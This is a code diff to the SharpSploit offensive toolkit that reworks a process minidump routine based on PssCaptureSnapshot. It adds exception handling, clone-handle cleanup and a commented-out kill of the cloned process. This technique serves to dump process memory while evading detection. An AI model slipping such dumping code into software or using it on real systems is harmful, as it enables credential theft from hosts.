@@ -14,6 +14,7 @@ using System.Runtime.InteropServices;
 using SharpSploit.Generic;
 using SharpSploit.Execution;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
+using Microsoft.PowerShell.Commands;
 
 namespace SharpSploit.Enumeration
 {
@@ -374,11 +375,16 @@ namespace SharpSploit.Enumeration
                 | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
                 | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;
 
-            Int32 hr = PInvoke.Win32.Kernel32.PssCaptureSnapshot(process.Handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
+            snapshotHandle = IntPtr.Zero;
 
-            if (hr != 0)
+            try
             {
-                Console.WriteLine($"PssCaptureSnapshot failed. ({hr})");
+                Int32 hr = PInvoke.Win32.Kernel32.PssCaptureSnapshot(process.Handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
+            }
+            catch (System.EntryPointNotFoundException e)
+            {
+                Console.Error.WriteLine(e.Message);
+                Environment.Exit(-1);
             }
 
             Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION();
@@ -403,6 +409,20 @@ namespace SharpSploit.Enumeration
             {
                 File.Delete(fullPath);
             }
+            
+            IntPtr vaCloneHandle;
+            PInvoke.Win32.Kernel32.PssQuerySnapshot(snapshotHandle, Execution.Win32.Kernel32.PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out vaCloneHandle, IntPtr.Size);
+
+            var cloneProcessId = PInvoke.Win32.Kernel32.GetProcessId(vaCloneHandle);
+
+            PInvoke.Win32.Kernel32.PssFreeSnapshot(Process.GetCurrentProcess().Handle, snapshotHandle);
+            PInvoke.Win32.Kernel32.CloseHandle(vaCloneHandle);
+            
+            //Process.GetProcessById(cloneProcessId).Kill();
+
+            Marshal.FreeHGlobal(pCallbackInfo);
+            GC.KeepAlive(CallbackInfo);
+
         }
 
         /// <summary>
